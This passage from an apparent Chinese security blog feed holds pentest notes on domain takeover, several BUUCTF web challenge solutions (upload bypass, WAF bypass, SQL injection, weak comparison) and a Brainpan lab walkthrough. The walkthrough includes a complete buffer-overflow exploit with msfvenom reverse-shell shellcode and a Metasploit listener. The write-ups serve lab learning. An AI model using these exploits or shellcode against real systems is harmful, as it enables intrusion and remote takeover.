<h1 id="拿域控的几种方式"><a href="#拿域控的几种方式" class="headerlink" title="拿域控的几种方式"></a>拿域控的几种方式</h1><p>net time /domain</p>
<p><strong>利用GPP漏洞获取域管理权限</strong></p>
<p>SYSVOL是域内的共享文件夹，用来存放登录脚本、组策略脚本等信息。当域管理员通过组策略修改密码时，在脚本中引入用户密码，就可能导致安全问题</p>
<p><strong>获取服务器明文登录密码</strong></p>
<p><strong>使用MS14-068漏洞进行提权</strong></p>
<p><strong>窃取域管理员令牌</strong></p>
<p><strong>进程迁移</strong></p>
<p>入侵了域管理员所登录的服务器，将进程迁移到域管理员所运行的进程，就可以获得域管理员权限。</p>
<h1 id="内网扩大战果"><a href="#内网扩大战果" class="headerlink" title="内网扩大战果"></a>内网扩大战果</h1><p>查看本机的IP地址</p>
<p>查看路由表</p>
<p>查看本地连接信息</p>
<p>利用dns信息</p>
<p>利用域信息</p>
<p>使用arp命令</p>
<p>查看本地的hosts文件</p>
<p>查看本地用户的连接信息</p>
<h1 id="java反序列化函数"><a href="#java反序列化函数" class="headerlink" title="java反序列化函数"></a>java反序列化函数</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">序列化：java.io.ObjectOutputStream 类中的 writeObject()</span><br><span class="line"></span><br><span class="line">反序列化：java.io.ObjectInputStream 类中的 readObject()</span><br></pre></td></tr></table></figure>

<h1 id="cs不出网上线的几种方法"><a href="#cs不出网上线的几种方法" class="headerlink" title="cs不出网上线的几种方法"></a>cs不出网上线的几种方法</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">存在一台中转机器：</span><br><span class="line">SMB Beacon</span><br><span class="line">中转listener</span><br><span class="line">HTTP 代理</span><br><span class="line">TCP Beacon(正向)</span><br><span class="line">使用pystinger进行代理转发</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>-basic</category>
      </categories>
  </entry>
  <entry>
    <title>BUUCTF刷题日志2</title>
    <url>/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/</url>
    <content><![CDATA[<h1 id="BUUCTF刷题日志2"><a href="#BUUCTF刷题日志2" class="headerlink" title="BUUCTF刷题日志2"></a>BUUCTF刷题日志2</h1><h2 id="第一题-极客大挑战-2019-Upload"><a href="#第一题-极客大挑战-2019-Upload" class="headerlink" title="第一题 [极客大挑战 2019]Upload"></a>第一题 [极客大挑战 2019]Upload</h2><p>一个文件上传，过滤了php3，但是除了php3我们还有phtml，上传的时候改下content-type:image/jpeg</p>
<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117150427298.png" alt="image-20220117150427298"></p>
<p>但是我们的马里面的&lt;?又被过滤了，所以用<code>&lt;script language=&quot;php&quot;&gt;   &lt;/script&gt; </code>来进行绕过</p>
<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117151055301.png" alt="image-20220117151055301"></p>
<p>添加一个gif的文件头进去，绕过这个判断</p>
<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117151122705.png" alt="image-20220117151122705"></p>
<p>上传成功</p>
<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117151158231.png" alt="image-20220117151158231"></p>
<p>猜测路径为<code>/upload/新建文本文档.phtml</code></p>
<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117152049720.png" alt="image-20220117152049720"></p>
<p>成功在根目录找到flag</p>
<h2 id="第二题-文件上传"><a href="#第二题-文件上传" class="headerlink" title="第二题 文件上传"></a>第二题 文件上传</h2><p>一个前端绕过罢了，还是用phtml文件</p>
<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117154044267.png" alt="image-20220117154044267"></p>
<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117154204041.png" alt="image-20220117154204041"></p>
<p>在根目录找到flag</p>
<h2 id="第三题-php解析特性-char绕过"><a href="#第三题-php解析特性-char绕过" class="headerlink" title="第三题 php解析特性 char绕过"></a>第三题 php解析特性 char绕过</h2><p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117154748431.png" alt="image-20220117154748431"></p>
<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117154838651.png" alt="image-20220117154838651"></p>
<p>有前端验证</p>
<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117155745159.png" alt="image-20220117155745159"></p>
<p>在源码中发现了calc.php<img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117161601913.png" alt="image-20220117161601913"></p>
<p>写不来了，看了别人的wp，</p>
<p>然后说waf无法识别加了空格的num参数，” num”和”num”，加了空格就不是num参数了，但是php解析的时候会自动把空格去掉，然后就绕过了waf。</p>
<p>然后使用scandir()函数，scandir(“/“)但是/被过滤了，所以用char(“47”)来代替</p>
<p><code>? num=print_r(scandir(chr(47)));</code></p>
<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117162229698.png" alt="image-20220117162229698"></p>
<p>发现flag，然后就访问这个flag</p>
<p>calc.php? <code>num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code></p>
<h2 id="第四题-sql注入-极客大挑战-2019-BabySQL"><a href="#第四题-sql注入-极客大挑战-2019-BabySQL" class="headerlink" title="第四题 sql注入[极客大挑战 2019]BabySQL"></a>第四题 sql注入[极客大挑战 2019]BabySQL</h2><p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117170804546.png" alt="image-20220117170804546"></p>
<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117170814134.png" alt="image-20220117170814134"></p>
<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117171730895.png" alt="image-20220117171730895"></p>
<p>但是可以双写绕过select和union</p>
<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117171950628.png" alt="image-20220117171950628"></p>
<p>爆出列数有三个</p>
<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117172055414.png" alt="image-20220117172055414"></p>
<p>然后又是枯燥的爆表爆字段</p>
<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117172428770.png" alt="image-20220117172428770"></p>
<p>人嘛了，information里面的or都被过滤了</p>
<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117172541108.png" alt="image-20220117172541108"></p>
<p>反正一步一步爆，然后就出来了</p>
<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117173343401.png" alt="image-20220117173343401"></p>
<h2 id="第五题-备份文件-代码审计-弱类型"><a href="#第五题-备份文件-代码审计-弱类型" class="headerlink" title="第五题 备份文件 代码审计 弱类型"></a>第五题 备份文件 代码审计 弱类型</h2><p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117201827743.png" alt="image-20220117201827743"></p>
<p>发现备份文件,又是代码审计</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric(<span class="variable">$key</span>)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;Just num!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$key</span> = intval(<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span> == <span class="variable">$str</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Try to find out source file!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>弱比较：如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行，在比较时该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。</p>
<p>所以我们直接传值key=123</p>
<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117202715872.png" alt="image-20220117202715872"></p>
<p>得到flag</p>
<h2 id="第六题-模板注入"><a href="#第六题-模板注入" class="headerlink" title="第六题 模板注入"></a>第六题 模板注入</h2><p>经典老题目了</p>
<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117202952675.png" alt="image-20220117202952675"></p>
<p>flag中提示了flag的位置<code>flag in /fllllllllllllag</code></p>
<p>welcome中提示了<code>render</code>模板渲染用的函数</p>
<p>hints中提示了filehash的加密方法<code>md5(cookie_secret+md5(filename))</code></p>
<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117203315129.png" alt="image-20220117203315129"></p>
<p>然后就开始模板注入，我们的目的就是获取cookie_secret</p>
<p>[(33条消息) BUUCTF <a href="https://blog.csdn.net/weixin_45642610/article/details/112519061">护网杯 2018]easy_tornado 1_wow小华的博客-CSDN博客</a></p>
]]></content>
      <categories>
        <category>-Experience</category>
      </categories>
  </entry>
  <entry>
    <title>Brainpan: 1</title>
    <url>/2022/11/06/Brainpan-1/</url>
    <content><![CDATA[<h1 id="Brainpan-1"><a href="#Brainpan-1" class="headerlink" title="Brainpan: 1"></a>Brainpan: 1</h1><p>本次靶场涉及到缓冲区溢出，我就当学习这个东西了，缓冲区溢出看看攻略。</p>
<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>首先还是找到靶场的位置为第一步</p>
<p><code>nmap 192.168.100.0/24 -n -sP -sn</code></p>
<p><img src="/2022/11/06/Brainpan-1/image-20221106131316606.png" alt="image-20221106131316606"></p>
<p>拿到对面ip地址为<code>192.168.100.171</code></p>
<p>进行端口扫描</p>
<p><code>nmap -A 192.168.100.171</code></p>
<p><img src="/2022/11/06/Brainpan-1/image-20221106131541462.png" alt="image-20221106131541462"></p>
<p>开启了9999和10000端口</p>
<p>看到9999提示需要输入密码，我们访问10000并且扫描一下目录。</p>
<p><code>dirb http://192.168.100.171:10000</code></p>
<p>扫到bin目录，并且发现exe文件</p>
<p><img src="/2022/11/06/Brainpan-1/image-20221106131844067.png" alt="image-20221106131844067"></p>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>我个人的见解，在靶场中要是看到了exe文件那百分之八十都是缓冲区溢出漏洞。</p>
<p>下载之后打开发现，这是一个开启9999端口等待连接的程序</p>
<p><img src="/2022/11/06/Brainpan-1/image-20221106133554037.png" alt="image-20221106133554037"></p>
<p>联想到刚才扫描到的9999端口，对面就是在9999同样开启了这么一个服务。</p>
<h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><p>一个是poc一个是exp</p>
<p>poc：检测溢出的地方是在多少字符串</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> socket, time, sys</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;192.168.100.168&quot;</span></span><br><span class="line"></span><br><span class="line">port = <span class="number">9999</span></span><br><span class="line">timeout = <span class="number">5</span></span><br><span class="line">prefix = <span class="string">&quot;OVERFLOW1 &quot;</span></span><br><span class="line"></span><br><span class="line">string = prefix + <span class="string">&quot;A&quot;</span> * <span class="number">100</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="keyword">as</span> s:</span><br><span class="line">      s.settimeout(timeout)</span><br><span class="line">      s.connect((ip, port))</span><br><span class="line">      s.recv(<span class="number">1024</span>)</span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&quot;Fuzzing with &#123;&#125; bytes&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(string) - <span class="built_in">len</span>(prefix)))</span><br><span class="line">      s.send(<span class="built_in">bytes</span>(string, <span class="string">&quot;latin-1&quot;</span>))</span><br><span class="line">      s.recv(<span class="number">1024</span>)</span><br><span class="line">  <span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Fuzzing crashed at &#123;&#125; bytes&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(string) - <span class="built_in">len</span>(prefix)))</span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line">  string += <span class="number">100</span> * <span class="string">&quot;A&quot;</span></span><br><span class="line">  time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>exp:向服务发出缓冲区溢出攻击</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#这里主要是为了定位EIP的内存地址</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;192.168.100.168&quot;</span></span><br><span class="line">port = <span class="number">9999</span></span><br><span class="line"></span><br><span class="line">prefix = <span class="string">&quot;OVERFLOW1 &quot;</span></span><br><span class="line">offset = <span class="number">0</span></span><br><span class="line">overflow = <span class="string">&quot;A&quot;</span> * offset</span><br><span class="line">retn = <span class="string">&quot;&quot;</span></span><br><span class="line">padding = <span class="string">&quot;&quot;</span></span><br><span class="line">payload = <span class="string">&quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A&quot;</span></span><br><span class="line">postfix = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">buffer = prefix + overflow + retn + padding + payload + postfix</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">  s.connect((ip, port))</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;Sending evil buffer...&quot;</span>)</span><br><span class="line">  s.send(<span class="built_in">bytes</span>(buffer + <span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;latin-1&quot;</span>))</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;Done!&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;Could not connect.&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p><a href="https://blog.csdn.net/clark3256453/article/details/121422527">(120条消息) Immunity Debugger中安装mona_唐风的风的博客-CSDN博客</a></p>
<p>我这里由于本机环境问题，我就给安装到虚拟机上面了。</p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="fuzzing"><a href="#fuzzing" class="headerlink" title="fuzzing"></a>fuzzing</h3><p>首先在虚拟机上打开我们下载好的exe</p>
<p>首先使用poc检测是否存在缓冲区溢出漏洞</p>
<p><img src="/2022/11/06/Brainpan-1/image-20221106151706491.png" alt="image-20221106151706491"></p>
<p>发现在发送到600字节的时候就崩溃了，说明存在缓冲区溢出漏洞。</p>
<h3 id="计算EIP位置"><a href="#计算EIP位置" class="headerlink" title="计算EIP位置"></a>计算EIP位置</h3><p>此时我们生成一段不重复字节，我们在这里选择600个字节，执行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/06/Brainpan-1/image-20221106152001387.png" alt="image-20221106152001387"></p>
<p>复制这串字符，放到我们的exp中</p>
<p><img src="/2022/11/06/Brainpan-1/image-20221106152057720.png" alt="image-20221106152057720"></p>
<p>现在把exe放在immunity debugger中运行，观察其中EIP的值为</p>
<p>72413172</p>
<p><img src="/2022/11/06/Brainpan-1/image-20221106153446651.png" alt="image-20221106153446651"></p>
<p>计算一下偏移量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 72413172</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/06/Brainpan-1/image-20221106153510541.png" alt="image-20221106153510541"></p>
<p>偏移量为514</p>
<h3 id="查找坏字节"><a href="#查找坏字节" class="headerlink" title="查找坏字节"></a>查找坏字节</h3><p>我们在Immunity Debugger中输入：<code>!mona bytearray -b &quot;\x00&quot;</code></p>
<p>0x00在C/C++语言中表示终止，所以是一个很普遍的坏字节，在上面我们首先把它排除掉。 我们用下面的bytearray.py脚本生成所有字节码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for x in range(1, 256):</span><br><span class="line">  print(&quot;\\x&quot; + &quot;&#123;:02x&#125;&quot;.format(x), end=&#x27;&#x27;)</span><br><span class="line">print()</span><br></pre></td></tr></table></figure>

<p>执行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root kali)-[~/tryhackme/Brainpan]</span><br><span class="line">└─# python3 bytearray.py                 </span><br><span class="line">\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b \x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff</span><br></pre></td></tr></table></figure>

<p>此时我们准备第二个攻击脚本exploit2.py，把上面生成的字节码粘贴到payload变量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">#!/usr/bin/python</span><br><span class="line"></span><br><span class="line">#这里主要是为了定位EIP的内存地址</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">ip = &quot;127.0.0.1&quot;</span><br><span class="line">port = 9999</span><br><span class="line"></span><br><span class="line">prefix = &quot;OVERFLOW1 &quot;</span><br><span class="line">offset = 514</span><br><span class="line">overflow = &quot;A&quot; * offset</span><br><span class="line">retn = &quot;BBBB&quot;</span><br><span class="line">padding = &quot;&quot;</span><br><span class="line">payload = &quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b \x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;</span><br><span class="line">postfix = &quot;&quot;</span><br><span class="line"></span><br><span class="line">buffer = prefix + overflow + retn + padding + payload + postfix</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">  s.connect((ip, port))</span><br><span class="line">  print(&quot;Sending evil buffer...&quot;)</span><br><span class="line">  s.send(bytes(buffer + &quot;\r\n&quot;, &quot;latin-1&quot;))</span><br><span class="line">  print(&quot;Done!&quot;)</span><br><span class="line">except:</span><br><span class="line">  print(&quot;Could not connect.&quot;)</span><br></pre></td></tr></table></figure>

<p>同时，我们把偏移量514赋值到offset变量，把”BBBB”赋值到retn变量，重启brainpan.exe，执行上面的脚本</p>
<p><img src="/2022/11/06/Brainpan-1/image-20221106153645803.png" alt="image-20221106153645803"></p>
<p>可以看到EIP的值，此时已经变成42424242了，42在ASCII里面就是大写的B，也就是我们的retn值已经 成功覆盖到EIP中。</p>
<p>同时也记住这里的ESP值为005FF921（又走了一位）</p>
<p>我们执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">!mona compare -f C:\mona\brainpan\bytearray.bin -a 0028F930</span><br></pre></td></tr></table></figure>

<p>除了执行上面那个命令，我们也可以通过查看</p>
<p><img src="/2022/11/06/Brainpan-1/image-20221106185820388.png" alt="image-20221106185820388"></p>
<p>跟进去查看有没有无法显示的字节</p>
<p>但是博主说这里面没有怀字节，因为我没找到这个bin文件，不过，0x00在C/C++语言中表示终止，所以是一个很普遍的坏字节，因此在这种情况下，我们可以认为唯一的坏字节是：<code>\x00</code></p>
<h3 id="找到可以利用的ESP地址"><a href="#找到可以利用的ESP地址" class="headerlink" title="找到可以利用的ESP地址"></a>找到可以利用的ESP地址</h3><p><code>!mona jmp -r esp -cpb &quot;\x00&quot;</code>和<code>ctrl+f jmp esp</code>都可以找到这个地址</p>
<p>311712F3</p>
<p>需要注意的是这个地址需要从后面往回写，即:<code>\xf3\x12\x17\x31</code></p>
<h3 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h3><p>然后直接使用msf生成一个反弹的shellcode</p>
<p><code>msfvenom -p linux/x86/shell_reverse_tcp -b &quot;\x00&quot; LHOST=192.168.100.129 LPORT=4444 -f python</code></p>
<p>放到下面的exp中</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;192.168.100.171&quot;</span></span><br><span class="line">port = <span class="number">9999</span></span><br><span class="line"></span><br><span class="line">prefix = <span class="string">&quot;OVERFLOW1 &quot;</span></span><br><span class="line">offset = <span class="number">514</span>   <span class="comment">#偏移地址</span></span><br><span class="line">overflow = <span class="string">&quot;A&quot;</span> * offset</span><br><span class="line">retn = <span class="string">&quot;\xf3\x12\x17\x31&quot;</span>  <span class="comment">#上面找到的esp地址</span></span><br><span class="line"></span><br><span class="line">padding = <span class="string">&quot;\x90&quot;</span> * <span class="number">50</span>  <span class="comment">#我这里理解为防止shell在前面没执行到，先填充一点？</span></span><br><span class="line"></span><br><span class="line">buf =  <span class="string">&quot;&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\xd9\xee\xbf\x4b\xc4\x96\xdd\xd9\x74\x24\xf4\x58\x31&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\xc9\xb1\x12\x31\x78\x17\x83\xc0\x04\x03\x33\xd7\x74&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x28\xf2\x0c\x8f\x30\xa7\xf1\x23\xdd\x45\x7f\x22\x91&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x2f\xb2\x25\x41\xf6\xfc\x19\xab\x88\xb4\x1c\xca\xe0&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x86\x77\x48\x71\x6e\x8a\x91\x60\x33\x03\x70\x32\xad&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x43\x22\x61\x81\x67\x4d\x64\x28\xe7\x1f\x0e\xdd\xc7&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\xec\xa6\x49\x37\x3c\x54\xe3\xce\xa1\xca\xa0\x59\xc4&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x5a\x4d\x97\x87&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = buf</span><br><span class="line">postfix = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">buffer = prefix + overflow + retn + padding + payload + postfix</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">  s.connect((ip, port))</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;Sending evil buffer...&quot;</span>)</span><br><span class="line">  s.send(<span class="built_in">bytes</span>(buffer + <span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;latin-1&quot;</span>))</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;Done!&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;Could not connect.&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>msf监听</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload linux/x86/shell_reverse_tcp</span><br><span class="line">set lport 443</span><br><span class="line">set lhost 192.168.2.157</span><br><span class="line">exploit -j</span><br></pre></td></tr></table></figure>

<p>就可以看到弹回一个会话了</p>
<p><img src="/2022/11/06/Brainpan-1/image-20221106190010146.png" alt="image-20221106190010146"></p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p><img src="/2022/11/06/Brainpan-1/image-20221106191721538.png" alt="image-20221106191721538"></p>
<p>没有密码的root权限，那我们就</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo /home/anansi/bin/anansi_util</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/06/Brainpan-1/image-20221106191759405.png" alt="image-20221106191759405"></p>
<p>第三个参数可以执行命令</p>
